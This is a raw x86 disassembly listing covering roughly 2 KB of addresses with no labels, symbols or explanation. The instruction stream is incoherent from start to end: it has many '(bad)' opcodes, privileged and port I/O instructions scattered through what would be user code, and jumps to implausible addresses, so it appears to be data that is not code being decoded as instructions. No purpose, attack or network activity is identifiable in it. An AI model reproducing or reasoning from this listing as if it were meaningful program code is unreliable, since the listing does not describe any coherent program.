  418781:	pop    esi
  418782:	call   0x8187b2
  418787:	fsubr  st,st(3)
  418789:	sti    
  41878a:	add    BYTE PTR gs:[ecx],bh
  41878d:	add    eax,esp
  41878f:	add    DWORD PTR [esi],eax
  418791:	rol    DWORD PTR [ebp+0x8],0x29
  418795:	mov    esp,eax
  418797:	clc    
  418798:	jne    0x41880f
  41879a:	mov    eax,0x8b0673
  41879f:	loopne 0x4187e6
  4187a1:	loopne 0x41872c
  4187a3:	lods   al,BYTE PTR ds:[esi]
  4187a4:	int3   
  4187a5:	inc    ebp
  4187a6:	mov    DWORD PTR gs:[eax+edi*8],eax
  4187aa:	add    al,0xc3
  4187ac:	sub    ecx,DWORD PTR [ebp+0x47]
  4187af:	(bad)  
  4187b1:	shr    BYTE PTR [ebp-0x1f],0xe8
  4187b5:	add    eax,DWORD PTR [eax]
  4187b7:	call   0x64348bc
  4187bc:	add    esi,DWORD PTR [esi-0x3b2efc83]
  4187c2:	dec    esi
  4187c3:	ins    DWORD PTR es:[edi],dx
  4187c4:	in     al,dx
  4187c5:	lea    eax,[eax]
  4187c7:	inc    ebp
  4187c8:	inc    ebp
  4187c9:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  4187cf:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  4187d9:	and    al,0xdc
  4187db:	ror    DWORD PTR [edx+0x24],0xf7
  4187df:	or     BYTE PTR [ebp+0x4c],dh
  4187e2:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  4187e6:	stos   BYTE PTR es:[edi],al
  4187e7:	adc    edx,edi
  4187e9:	inc    esp
  4187ea:	add    edi,DWORD PTR [eax]
  4187ec:	jne    0x4187d1
  4187ee:	mov    DWORD PTR [eax-0x7449db04],ecx
  4187f4:	cmp    ecx,DWORD PTR [edi]
  4187f6:	sub    BYTE PTR [ebp-0x7e],dl
  4187f9:	sar    ebp,0xb
  4187fc:	jmp    FWORD PTR [edi+0x2400392a]
  418802:	sub    esi,DWORD PTR [ebx-0x73]
  418805:	mov    esp,DWORD PTR [ecx+edi*4]
  418808:	mov    ecx,DWORD PTR [eax]
  41880a:	and    BYTE PTR [eax],al
  41880c:	jne    0x4187d8
  41880e:	sub    ebp,ecx
  418810:	sbb    BYTE PTR [esi+0x32],ah
  418813:	dec    ebp
  418814:	push   ebp
  418815:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  41881b:	ret    
  41881c:	mov    edx,ebp
  41881e:	leave  
  41881f:	sub    DWORD PTR [esi+0x24],ebx
  418822:	ret    0x2b
  418825:	pop    ax
  418827:	push   ebp
  418828:	rol    BYTE PTR [ebx],0xeb
  41882b:	add    DWORD PTR [ecx+0x6c0001],0x40
  418832:	jb     0x418889
  418834:	ret    
  418835:	in     al,dx
  418836:	jecxz  0x4187c3
  418838:	push   esi
  418839:	xchg   esp,eax
  41883a:	jne    0x41883c
  41883c:	cmp    edx,DWORD PTR [esi+0x1c]
  41883f:	jne    0x418825
  418841:	mov    eax,DWORD PTR [ebp-0x77]
  418844:	ror    DWORD PTR [ebx+0x899408],0xe0
  41884b:	mov    esi,DWORD PTR [ebp-0x75]
  41884e:	pop    esi
  41884f:	nop
  418850:	mov    eax,DWORD PTR [eax]
  418852:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  418858:	add    al,0x0
  41885a:	inc    ebp
  41885b:	mov    eax,DWORD PTR [ebx]
  41885d:	mov    ebp,ebx
  41885f:	cmp    al,0xf
  418861:	or     al,al
  418863:	inc    ebp
  418864:	inc    ebp
  418865:	xor    DWORD PTR [ebx+0x6c8bc89c],ecx
  41886b:	cld    
  41886c:	add    BYTE PTR [edi+0x556c16c0],dh
  418872:	add    BYTE PTR [ecx-0x5],dl
  418875:	add    eax,0x17200
  41887a:	sbb    al,0x85
  41887c:	dec    esp
  41887d:	je     0x4188b7
  41887f:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  418883:	add    BYTE PTR [ebx],bh
  418885:	(bad)  
  418886:	and    al,0x30
  418888:	jae    0x418826
  41888a:	mov    cl,cl
  41888c:	inc    DWORD PTR [esp]
  41888f:	push   ebp
  418890:	shr    esp,0x8
  418893:	in     al,dx
  418894:	push   esp
  418895:	add    DWORD PTR [eax],esp
  418897:	add    bl,cl
  418899:	inc    ebp
  41889a:	mov    bh,0x53
  41889c:	add    BYTE PTR [ebp-0x17],al
  41889f:	push   esi
  4188a0:	cmovne ecx,edx
  4188a3:	xor    BYTE PTR [esp+ebx*4+0x20],cl
  4188a7:	push   edi
  4188a8:	pop    ss
  4188a9:	xor    ecx,ebx
  4188ab:	pushf  
  4188ac:	add    BYTE PTR [ecx+0x452bf800],cl
  4188b2:	rcr    ecx,0x5
  4188b5:	inc    ebp
  4188b6:	add    esp,ebx
  4188b8:	add    BYTE PTR [ebp-0x40],al
  4188bb:	out    0x6c,eax
  4188bd:	inc    ebp
  4188be:	inc    eax
  4188bf:	sub    eax,0x450547c1
  4188c4:	dec    esp
  4188c5:	and    BYTE PTR cs:[ebp-0x27],al
  4188c9:	jo     0x4188f4
  4188cb:	leave  
  4188cc:	add    BYTE PTR [esi+0xc000c0],bh
  4188d2:	lea    eax,[esp-0x40]
  4188d6:	ret    
  4188d7:	mov    dh,0x8b
  4188d9:	xor    edx,DWORD PTR [ecx+0x3]
  4188dc:	mov    al,BYTE PTR [ecx+0x1]
  4188df:	sbb    BYTE PTR [eax],al
  4188e1:	stc    
  4188e2:	mov    esi,DWORD PTR [edx+0x8]
  4188e5:	(bad)  
  4188e6:	ss mov eax,0xb98ac631
  4188ec:	add    esi,eax
  4188ee:	add    BYTE PTR [edx-0x444d39f7],bh
  4188f4:	add    esi,eax
  4188f6:	add    BYTE PTR [esi+ecx*1+0x1bd82c6],bh
  4188fd:	mov    BYTE PTR [eax],0xbe
  418900:	or     BYTE PTR [ebx],dh
  418902:	dec    ecx
  418903:	lea    eax,[ebx]
  418905:	or     eax,0x18fc0fc7
  41890a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41890b:	(bad)  
  41890d:	fiadd  WORD PTR [ebp-0x78]
  418910:	jae    0xed76905f
  418916:	or     BYTE PTR [ebp+0x7],al
  418919:	in     eax,dx
  41891a:	pushf  
  41891b:	inc    ebp
  41891c:	xor    bl,al
  41891e:	pop    esi
  41891f:	inc    ebp
  418920:	shl    esp,0xc
  418923:	inc    ebp
  418924:	sub    cl,0x1
  418927:	inc    ebp
  418928:	add    bh,bl
  41892a:	add    BYTE PTR [ebp-0x7b],al
  41892d:	loopne 0x418927
  41892f:	inc    ebp
  418930:	ret    0xe7
  418933:	inc    ebp
  418934:	mov    esi,DWORD PTR [eax-0x7f]
  418937:	leave  
  418938:	and    al,0x44
  41893a:	add    BYTE PTR [eax+0x331cb68b],dh
  418940:	mov    DWORD PTR [ebx],eax
  418942:	sbb    al,0x41
  418944:	(bad)  
  418945:	sbb    al,ah
  418947:	stc    
  418948:	test   DWORD PTR [edx-0x8],esi
  41894b:	lea    edi,[edi-0x7007a98]
  418951:	mov    DWORD PTR [ebp-0x2c],edi
  418954:	(bad)  
  418955:	dec    ebp
  418956:	sar    BYTE PTR [eax+0x71c1fcc6],0xc6
  41895d:	add    edx,eax
  41895f:	(bad)  
  418960:	(bad)  
  418961:	inc    ebx
  418963:	jmp    FWORD PTR [edx-0x38]
  418966:	(bad)  
  418967:	or     al,ah
  418969:	jge    0x418931
  41896b:	mov    ebp,0x5a8533e4
  418971:	clc    
  418972:	leave  
  418973:	inc    ebp
  418974:	add    BYTE PTR [ebx+0xd8c8d],cl
  41897a:	rdpmc  
  41897c:	sbb    BYTE PTR [edi+0x7de08da],bh
  418982:	mov    BYTE PTR [ebx+eax*4-0x12c6f9ce],bl
  418989:	cmovne edx,ebx
  41898c:	jmp    0x41898e
  41898e:	inc    ebp
  41898f:	mov    ebp,ebp
  418991:	sbb    al,0x45
  418993:	mov    ebx,ebx
  418995:	add    DWORD PTR [ebp+0x0],eax
  418998:	out    dx,al
  418999:	add    DWORD PTR [ebp+0x4d],eax
  41899c:	sub    eax,0x2e80458b
  4189a1:	add    BYTE PTR [ebp-0x77],al
  4189a4:	jo     0x418a10
  4189a6:	leave  
  4189a7:	mov    DWORD PTR [esp+ecx*8-0x48],0x33e9b6d8
  4189af:	inc    ebp
  4189b0:	add    ebx,edi
  4189b2:	inc    ecx
  4189b3:	out    0x18,eax
  4189b5:	(bad)  
  4189b6:	stc    
  4189b7:	int3   
  4189b8:	jb     0x418944
  4189ba:	(bad)  
  4189bb:	xor    dh,BYTE PTR [eax-0x4ec83980]
  4189c1:	or     dh,al
  4189c3:	dec    esi
  4189c4:	mov    dl,0xf3
  4189c6:	mov    BYTE PTR [ebp-0x4d],0x89
  4189ca:	(bad)  
  4189cb:	loopne 0x418981
  4189cd:	inc    esi
  4189cf:	lea    esi,[ebp-0x49003924]
  4189d5:	push   eax
  4189d6:	mov    BYTE PTR [ebp-0x49],0x33
  4189da:	xor    eax,DWORD PTR [ebx]
  4189dc:	lea    edx,[eax+0xd]
  4189df:	inc    ebp
  4189e0:	jae    0x8c1beffe
  4189e6:	ficomp WORD PTR [eax+ecx*4]
  4189e9:	add    BYTE PTR [ebx-0x12fff7ff],0x85
  4189f0:	test   esi,edi
  4189f2:	(bad)  
  4189f3:	(bad)  
  4189f4:	inc    DWORD PTR [eax]
  4189f6:	inc    ebp
  4189f7:	add    BYTE PTR [ebx-0x10aa2bd0],cl
  4189fd:	test   DWORD PTR [ebx],edx
  4189ff:	jne    0x41898a
  418a01:	or     DWORD PTR [ebx-0xed9771],0x75703b8c
  418a0b:	jmp    0x1258a99
  418a10:	inc    ebp
  418a11:	jne    0x4189f5
  418a13:	mov    DWORD PTR [eax+eiz*8+0x331cff8b],ebx
  418a1a:	mov    BYTE PTR [ebp+0x45009c01],cl
  418a20:	shl    BYTE PTR [eax],0x55
  418a23:	push   cx
  418a25:	mov    bx,0x7245
  418a29:	gs add bh,al
  418a2c:	add    DWORD PTR [ebp+eax*4+0xd801df],ebx
  418a33:	inc    ebp
  418a34:	dec    ebp
  418a35:	into   
  418a36:	mov    esp,ebx
  418a38:	jl     0x418a01
  418a3a:	add    BYTE PTR [ecx+ecx*4+0x1ce48bdb],ah
  418a41:	inc    ebp
  418a42:	mov    edi,ebx
  418a44:	add    ebp,esp
  418a46:	add    BYTE PTR [esi+0x1],ah
  418a49:	inc    ebp
  418a4a:	or     BYTE PTR [edi],bh
  418a4c:	inc    ebp
  418a4d:	(bad)  
  418a4e:	in     eax,dx
  418a4f:	fsubr  st(4),st
  418a51:	inc    edi
  418a53:	add    dl,al
  418a55:	add    al,ah
  418a57:	call   0x86a2cc
  418a5c:	pop    esi
  418a5d:	test   DWORD PTR [eax],ecx
  418a5f:	dec    dl
  418a61:	(bad)  
  418a62:	jmp    0x414012ec
  418a67:	push   DWORD PTR [ebp-0x75]
  418a6a:	(bad)  
  418a6b:	loopne 0x418a39
  418a6d:	mov    DWORD PTR [ebp-0x74013d],0xfec0851c
  418a77:	push   eax
  418a78:	inc    DWORD PTR [ebp-0x75]
  418a7b:	mov    esp,eax
  418a7d:	cwde   
  418a7e:	mov    DWORD PTR [eax],0xff8bffc3
  418a84:	sbb    al,0x8
  418a86:	ror    BYTE PTR [ebp+0x50],0x51
  418a8a:	inc    ebp
  418a8b:	ror    BYTE PTR [ebx+0x65987d],1
  418a91:	test   edi,eax
  418a93:	add    al,0xdc
  418a95:	add    bh,bh
  418a97:	push   0x1
  418a99:	add    BYTE PTR [eax],al
  418a9b:	mov    edi,edi
  418a9d:	inc    WORD PTR [ebp+0x8]
  418aa1:	add    eax,0xd
  418aa4:	(bad)  
  418aa6:	xor    eax,0x782ec89
  418aab:	push   ecx
  418aac:	cli    
  418aad:	popw   es
  418aaf:	push   ebp
  418ab0:	xchg   BYTE PTR [ebx-0x76740800],al
  418ab6:	sbb    al,0x86
  418ab8:	test   DWORD PTR [ecx-0x2],edx
  418abb:	call   WORD PTR [ebp-0x40]
  418abf:	adc    DWORD PTR [ebp-0x5],0xffffffc7
  418ac3:	mov    eax,ebx
  418ac5:	mov    dh,BYTE PTR ds:0xc7666851
  418acb:	push   ebp
  418acc:	fsub   QWORD PTR [esi+0x0]
  418acf:	dec    ebp
  418ad0:	inc    ebp
  418ad1:	mov    edx,0xec4ec0
  418ad6:	(bad)  
  418ad7:	retf   0x89a0
  418ada:	fist   DWORD PTR [eax+0x454ae1]
  418ae0:	jmp    0xa8b5:0xc7663e8b
  418ae7:	jmp    edx
  418ae9:	(bad)  
  418aea:	in     eax,dx
  418aeb:	lock (bad) 
  418aed:	mov    DWORD PTR [esi+ebp*2-0x727a0090],ebp
  418af4:	(bad)  
  418af5:	xor    eax,0x700089ff
  418afa:	add    bh,bh
  418afc:	stos   DWORD PTR es:[edi],eax
  418afd:	data16 add BYTE PTR [ebp-0x1b0077],al
  418b04:	inc    DWORD PTR [ecx-0x73]
  418b07:	data16 fadd QWORD PTR [ebp-0xaf0001]
  418b0e:	inc    ebp
  418b0f:	shl    BYTE PTR [ebx],0x66
  418b12:	add    eax,DWORD PTR [ebp-0xba00b0]
  418b18:	add    DWORD PTR [ecx+0x44],0x66
  418b1c:	mov    eax,DWORD PTR [ebp-0x7f00e4]
  418b22:	add    DWORD PTR [ecx-0xcf8600],ecx
  418b28:	push   ebp
  418b29:	lea    dx,[ebp-0x28]
  418b30:	add    BYTE PTR [ebp-0x25],0xf
  418b34:	jge    0xff428a3b
  418b3a:	mov    ecx,0xc34fc7
  418b3f:	rol    ecx,0x89
  418b42:	mov    DWORD PTR [eax+eax*4-0x1],ebp
  418b46:	ror    BYTE PTR [ebx-0x48990775],0x55
  418b4d:	or     BYTE PTR [ebp-0x763c0a39],0xc1
  418b54:	test   BYTE PTR [ecx-0x3f997f3e],cl
  418b5a:	push   ebp
  418b5b:	mov    DWORD PTR [ebp-0x76761480],ecx
  418b61:	or     BYTE PTR [eax+0x6600c265],0x45
  418b68:	push   ebp
  418b69:	xor    DWORD PTR [ebp-0x76381e64],ecx
  418b6f:	aam    0x8c
  418b71:	test   DWORD PTR [ecx-0x3dba7108],ecx
  418b77:	cmp    eax,0xc78b9c00
  418b7c:	data16 hlt 
  418b7e:	dec    ebp
  418b7f:	test   DWORD PTR [ecx+0x454ff8],edi
  418b85:	xor    ecx,esi
  418b87:	lahf   
  418b88:	mov    DWORD PTR [ebx-0x7f00e394],ecx
  418b8e:	mov    eax,DWORD PTR [ecx]
  418b90:	data16 add BYTE PTR [ebp-0x7400bb],dh
  418b97:	sbb    al,0x71
  418b99:	dec    ebp
  418b9a:	mov    si,WORD PTR [ebp-0xff0074]
  418ba1:	mov    ecx,DWORD PTR [ecx-0x6f8d75]
  418ba7:	add    BYTE PTR [ebp-0x760fd477],cl
  418bad:	jne    0x418c23
  418baf:	test   edi,edi
  418bb1:	jne    0x418b36
  418bb3:	(bad)  
  418bb4:	sti    
  418bb5:	sbb    BYTE PTR [ecx-0x1789ab],cl
  418bbb:	cld    
  418bbc:	(bad)  
  418bbd:	jmp    DWORD PTR [ecx]
  418bbf:	inc    ebp
  418bc0:	mov    DWORD PTR [ebx+0x3ff8b78],ecx
  418bc6:	data16 cmp al,0x8d
  418bc9:	push   cs
  418bca:	inc    DWORD PTR [ebp-0x1]
  418bcd:	test   DWORD PTR [ecx-0x838c],ecx
  418bd3:	sbb    al,0x8b
  418bd5:	lock clc 
  418bd7:	push   DWORD PTR [edi-0xe39375]
  418bdd:	xor    BYTE PTR [ebx],0x1
  418be0:	add    eax,DWORD PTR [eax]
  418be2:	xor    eax,DWORD PTR [eax]
  418be4:	mov    WORD PTR [ebp-0xba003d],0x4575
  418bed:	mov    ecx,DWORD PTR [edi]
  418bef:	sbb    al,0x4d
  418bf1:	mov    DWORD PTR [ebx],esi
  418bf3:	add    DWORD PTR [ebx],eax
  418bf5:	add    BYTE PTR [ebx],dh
  418bf7:	xor    DWORD PTR [esi-0x80],esp
  418bfa:	inc    ebp
  418bfb:	add    DWORD PTR [ebx],esi
  418bfd:	add    BYTE PTR [esi+0x50],ah
  418c00:	inc    ebp
  418c01:	jmp    0x868e6c
  418c06:	add    DWORD PTR [eax+0xc70194],0xffffffec
  418c0d:	or     BYTE PTR [ebp+0x4501f845],dh
  418c13:	jmp    0xdd8f09
  418c18:	(bad)  
  418c19:	push   cs
  418c1a:	in     al,0xc9
  418c1c:	test   DWORD PTR [ebp+0x4502f8],eax
  418c22:	xor    ecx,DWORD PTR [ebp-0x64]
  418c25:	mov    eax,edi
  418c27:	mov    esp,esp
  418c29:	push   eax
  418c2a:	add    eax,0x45fff885
  418c2f:	dec    DWORD PTR [ebx+0x339445]
  418c35:	add    ecx,DWORD PTR [ecx+0x452ce889]
  418c3b:	dec    DWORD PTR [ebx-0x4e0be375]
  418c41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418c42:	add    edi,edi
  418c44:	add    bh,bh
  418c46:	push   cs
  418c47:	xor    eax,DWORD PTR [eax+0x890103]
  418c4d:	xor    BYTE PTR [ebp-0x1],al
  418c50:	mov    DWORD PTR [ebp-0x36df38],ecx
  418c56:	push   cs
  418c57:	push   eax
  418c58:	jne    0x418c9f
  418c5a:	mov    esi,DWORD PTR [ebx]
  418c5c:	sbb    al,0x3
  418c5e:	jne    0x418cb0
  418c60:	inc    DWORD PTR [ebp-0x75]
  418c63:	add    eax,0x800f0
  418c68:	add    BYTE PTR [ebx-0x7f74e3bf],cl
  418c6e:	mov    DWORD PTR [ecx],eax
  418c70:	sbb    BYTE PTR [eax],al
  418c72:	leave  
  418c73:	test   DWORD PTR [edi-0x1],eax
  418c76:	jne    0x418c77
  418c78:	call   0xff42777d
  418c7d:	xor    BYTE PTR [ebp+0x4d],al
  418c80:	mov    edi,edi
  418c82:	enter  0x8,0x4d
  418c86:	mov    ecx,DWORD PTR [ebx-0x17fc74cd]
  418c8c:	mov    eax,DWORD PTR [eax]
  418c8e:	sbb    al,0x1
  418c90:	sbb    DWORD PTR [ebp+0x4d],eax
  418c93:	mov    DWORD PTR [ebx+0x18cc8b],ecx
  418c99:	inc    eax
  418c9a:	dec    DWORD PTR [ecx-0x27d775]
  418ca0:	add    BYTE PTR [ebx-0x38d72b01],cl
  418ca6:	xchg   ecx,eax
  418ca7:	ret    
  418ca8:	add    BYTE PTR [ebp-0x830075],al
  418cae:	add    BYTE PTR [ebp-0x75],al
  418cb1:	mov    DWORD PTR [ebp+0x8ff0430],ecx
  418cb7:	lea    edi,[edi+0x20]
  418cba:	add    bh,bh
  418cbc:	mov    edx,DWORD PTR [eax-0x7b]
  418cbf:	inc    ebp
  418cc0:	rdpmc  
  418cc2:	jne    0x418cc7
  418cc4:	add    BYTE PTR [eax-0x75],dl
  418cc7:	inc    ebp
  418cc8:	call   0x404195d2
  418ccd:	add    BYTE PTR [ecx-0xe3d775],cl
  418cd3:	or     BYTE PTR [ebx-0x38ff13ff],0x85
  418cda:	ret    
  418cdb:	inc    DWORD PTR [ebp-0xff0001]
  418ce1:	add    BYTE PTR [ebp-0x4b],al
  418ce4:	cmp    edi,0x24
  418ce7:	(bad)  
  418ce8:	push   DWORD PTR [eax]
  418cea:	add    BYTE PTR [ebp-0x39],dl
  418ced:	test   ebx,eax
  418cef:	je     0x418c76
  418cf1:	mov    edi,edi
  418cf3:	sbb    bh,bh
  418cf5:	test   DWORD PTR gs:[eax],eax
  418cf8:	(bad)  
  418cf9:	js     0x418cfa
  418cfb:	add    BYTE PTR [ebx-0x38b21fdd],cl
  418d01:	sub    eax,ebx
  418d03:	mov    ecx,DWORD PTR [ebx-0x5513e377]
  418d09:	add    eax,DWORD PTR [eax]
  418d0b:	dec    ebp
  418d0c:	push   eax
  418d0d:	mov    al,BYTE PTR [ebp+0x1]
  418d10:	mov    eax,DWORD PTR [ebp-0x68]
  418d13:	mov    eax,DWORD PTR [eax]
  418d15:	cld    
  418d16:	(bad)  
  418d17:	or     BYTE PTR [eax],ah
  418d19:	dec    ebp
  418d1a:	inc    DWORD PTR [eax+0x4]
  418d1d:	push   ecx
  418d1e:	add    BYTE PTR [edx-0x1],dh
  418d21:	mov    ecx,DWORD PTR [ecx+0x55cef83c]
  418d27:	or     DWORD PTR [ebx-0xfff3800],0x8b5545d6
  418d31:	add    ecx,DWORD PTR [ecx-0xf037477]
  418d37:	push   ecx
  418d38:	xor    BYTE PTR [ebx],al
  418d3a:	inc    ebp
  418d3b:	mov    DWORD PTR [ebx-0x7aaaafe8],ecx
  418d41:	(bad)  
  418d42:	push   eax
  418d44:	inc    DWORD PTR [eax]
  418d46:	inc    ebp
  418d47:	add    BYTE PTR [ebx],dh
  418d49:	add    BYTE PTR [ebx],0x0
  418d4c:	mov    DWORD PTR [ebx-0x150007d4],eax
  418d52:	lea    edx,[ebp-0x6c]
  418d55:	je     0x418cdc
  418d57:	(bad)  
  418d58:	dec    DWORD PTR [eax]
  418d5a:	call   DWORD PTR [ebp-0x7b]
  418d5d:	mov    edi,edi
  418d5f:	hlt    
  418d60:	call   DWORD PTR [ebp-0x75]
  418d63:	mov    esp,eax
  418d65:	cwde   
  418d66:	(bad)  
  418d67:	mov    bh,0xc3
  418d69:	mov    DWORD PTR [ebx-0x1100e39c],ecx
  418d6f:	add    DWORD PTR [eax],0x450050ff
  418d75:	mov    DWORD PTR [ebx+0x9598c8],ecx
  418d7b:	inc    edi
  418d7d:	jmp    DWORD PTR [eax]
  418d7f:	jmp    0xcd00:0x640481ff
  418d86:	mov    DWORD PTR [ebx],esi
  418d88:	and    al,0x81
  418d8a:	push   DWORD PTR [edx]
  418d8c:	call   FWORD PTR [edi+edi*8-0x3f74f78b]
  418d93:	add    esi,DWORD PTR [eax]
  418d95:	enter  0x3c45,0x83
  418d99:	add    ah,bh
  418d9b:	adc    DWORD PTR [ebx+0x768b5055],eax
  418da1:	add    ecx,DWORD PTR [ebx-0x31ba07cf]
  418da7:	mov    esi,eax
  418da9:	xor    BYTE PTR [ebp+0x45],cl
  418dac:	jmp    0x418d39
  418dae:	mov    ebx,DWORD PTR [eax]
  418db0:	in     al,dx
  418db1:	inc    ebp
  418db2:	or     al,0x2
  418db4:	dec    DWORD PTR [ebp-0x4]
  418db7:	jne    0x418e0e
  418db9:	mov    ecx,DWORD PTR [eax+0x18558be8]
  418dbf:	mov    edi,DWORD PTR [ebx]
  418dc1:	lock push eax
  418dc3:	xchg   ecx,eax
  418dc4:	jmp    0x341dbc9
  418dc9:	adc    al,0x8b
  418dcb:	inc    ebp
  418dcc:	mov    al,ds:0x8b04008b
  418dd1:	push   ebp
  418dd2:	sub    ecx,DWORD PTR [ecx-0x2d391308]
  418dd8:	push   ebp
  418dd9:	test   DWORD PTR [ebx-0x2900d701],ecx
  418ddf:	inc    ebp
  418de0:	dec    ebp
  418de1:	mov    DWORD PTR [ecx+0x45ffe424],ecx
  418de7:	mov    DWORD PTR [eax],0xe9ff0020
  418ded:	add    al,0x0
  418def:	add    BYTE PTR [eax],al
  418df1:	mov    eax,edx
  418df3:	push   eax
  418df4:	rol    DWORD PTR [ebp-0xb0077],1
  418dfa:	bound  eax,QWORD PTR [ebp+0x50]
  418dfd:	xor    ecx,DWORD PTR [ecx+0x55899803]
  418e03:	sub    al,0x89
  418e05:	push   esp
  418e07:	lea    edx,[ebp-0x6c]
  418e0a:	jne    0xffd78d22
  418e10:	inc    DWORD PTR [ebp-0x1d0001]
  418e16:	jnp    0xc7976e1c
  418e1c:	mov    eax,ebx
  418e1e:	fs mov edi,edi
  418e21:	sbb    al,0xc1
  418e23:	out    dx,al
  418e24:	or     al,0x0
  418e26:	ret    0x8d50
  418e29:	inc    ebp
  418e2a:	dec    DWORD PTR [ebx+0xfa98d7]
  418e30:	test   edi,edi
  418e32:	clc    
  418e33:	call   FWORD PTR [edi]
  418e35:	or     BYTE PTR [eax],cl
  418e37:	inc    ebp
  418e38:	dec    ebp
  418e39:	inc    DWORD PTR [ebx+0x74803114]
  418e3f:	add    DWORD PTR [ebx+0x45fc00],ecx
  418e45:	call   DWORD PTR [eax+edx*1]
  418e48:	add    ecx,DWORD PTR [ebp-0x38]
  418e4b:	push   esi
  418e4c:	adc    al,0x8
  418e4e:	mov    edx,DWORD PTR [ebp-0x14]
  418e51:	mov    ecx,DWORD PTR [ebp-0x4]
  418e54:	add    DWORD PTR [ebp-0x68],0xffffff8d
  418e58:	inc    DWORD PTR [esp+esi*8]
  418e5b:	inc    ebp
  418e5c:	stos   BYTE PTR es:[edi],al
  418e5d:	mov    edx,DWORD PTR [ebp+0x1c]
  418e60:	add    DWORD PTR [ebp-0x10],eax
  418e63:	mov    edx,DWORD PTR [ebp-0x70]
  418e66:	cmp    eax,DWORD PTR [eax]
  418e68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e69:	mov    eax,DWORD PTR [eax]
  418e6b:	sbb    al,0x73
  418e6d:	add    BYTE PTR [ebx],0x1
  418e70:	call   0x8971de75
  418e75:	xor    eax,ebp
  418e77:	pop    ds
  418e78:	inc    ebp
  418e79:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  418e7f:	(bad)  
  418e80:	push   DWORD PTR [edi]
  418e82:	mov    ecx,DWORD PTR [ebx+0x398503f8]
  418e88:	push   DWORD PTR [ebx-0x1]
  418e8b:	mov    eax,DWORD PTR [ebp-0x740075]
  418e91:	sub    eax,DWORD PTR [eax]
  418e93:	add    eax,DWORD PTR [eax]
  418e95:	mov    DWORD PTR [ecx+0x5f],eax
  418e98:	mov    DWORD PTR [ebx+0x28],ebx
  418e9b:	ret    0xff
  418e9e:	mov    ecx,DWORD PTR [ebx+0x1cc783d4]
  418ea4:	ret    
  418ea5:	mov    eax,DWORD PTR [ebp-0x6f0075]
  418eab:	add    BYTE PTR [ebp-0x7d],al
  418eae:	mov    DWORD PTR [eax],eax
  418eb0:	xor    BYTE PTR [edi+edi*8+0x20008d01],al
  418eb7:	sar    bh,cl
  418eb9:	test   BYTE PTR [eax+0x1],dl
  418ebc:	inc    ebp
  418ebd:	add    BYTE PTR [ebx],dh
  418ebf:	test   BYTE PTR [ebx],0x84
  418ec2:	push   eax
  418ec3:	add    BYTE PTR [ebp+0x0],al
  418ec6:	add    eax,0x86
  418ecb:	add    BYTE PTR [ebx-0x7f7be340],cl
  418ed1:	add    BYTE PTR [ecx],al
  418ed3:	add    BYTE PTR [eax],al
  418ed5:	mov    esi,0x550030
  418eda:	mov    ecx,DWORD PTR [edi]
  418edc:	sbb    al,0xda
  418ede:	jne    0x418ee0
  418ee0:	mov    edi,DWORD PTR [ecx]
  418ee2:	xor    BYTE PTR [eax+eax*1],0x84
  418ee6:	add    eax,DWORD PTR [eax]
  418ee8:	cld    
  418ee9:	add    BYTE PTR [ebp-0x4f],dh
  418eec:	mov    eax,DWORD PTR [ecx]
  418eee:	cld    
  418eef:	add    BYTE PTR [ecx-0x1bff009b],cl
  418ef5:	retf   0xe45
  418ef8:	add    eax,edx
  418efa:	sbb    al,0xb7
  418efc:	dec    ebp
  418efd:	or     al,0x89
  418eff:	dec    ebp
  418f00:	sbb    al,0xf
  418f02:	inc    ebp
  418f03:	dec    eax
  418f04:	mov    eax,DWORD PTR [ebx]
  418f06:	sbb    al,0xf
  418f08:	nop
  418f09:	scas   al,BYTE PTR es:[edi]
  418f0a:	add    DWORD PTR [eax],eax
  418f0c:	add    BYTE PTR [ebp-0x7674ebbb],cl
  418f12:	mov    eax,gs
  418f14:	add    bh,bh
  418f16:	mov    edi,edi
  418f18:	cmp    DWORD PTR [edi+0x72],edx
  418f1b:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  418f21:	gs cmp al,0x0
  418f24:	je     0x418efc
  418f26:	push   eax
  418f27:	sar    BYTE PTR [eax],1
  418f29:	mov    bh,0x3e
  418f2b:	push   cs
  418f2c:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  418f32:	add    DWORD PTR [ecx+0x12],ebp
  418f35:	dec    edx
  418f36:	(bad)  
  418f37:	mov    eax,edx
  418f39:	in     al,dx
  418f3a:	adc    DWORD PTR [ecx],esi
  418f3c:	pop    esi
  418f3d:	inc    ecx
  418f3e:	leave  
  418f3f:	or     DWORD PTR [eax],ebx
  418f41:	gs push ebp
  418f43:	add    ah,ch
  418f45:	into   
  418f46:	in     al,dx
  418f47:	enter  0xb756,0xf0
  418f4b:	push   cs
  418f4c:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  418f56:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  418f5c:	jnp    0x74421464
  418f62:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  418f68:	add    BYTE PTR [edi],cl
  418f6a:	mov    edi,DWORD PTR [ecx-0x78]
  418f6d:	ltr    WORD PTR [ecx-0x7b]
  418f71:	dec    DWORD PTR [edi]
  418f73:	clc    
  418f74:	out    0x45,eax
  418f76:	add    BYTE PTR [eax],cl
  418f78:	cmp    ebx,0xffffff8c
  418f7b:	jge    0x418f7d
  418f7d:	jb     0x418f8f
  418f7f:	je     0x508fff
  418f85:	pop    edx
  418f86:	push   esi
  418f87:	mov    ecx,DWORD PTR [edi]
  418f89:	in     al,dx
  418f8a:	rol    DWORD PTR [ebp+0x0],1
  418f8d:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  418f94:	cmp    DWORD PTR [ecx],0xfffffff0
  418f97:	hlt    
  418f98:	mov    esp,DWORD PTR [eax+0xf034d2b]
  418f9e:	(bad)  
  418fa0:	push   eax
  418fa1:	jns    0xb841741f
  418fa7:	lock push cs
  418fa9:	ror    edx,0x3
  418fac:	test   BYTE PTR [ecx+0x5500e800],cl
  418fb2:	dec    eax
  418fb3:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  418fb7:	(bad)  
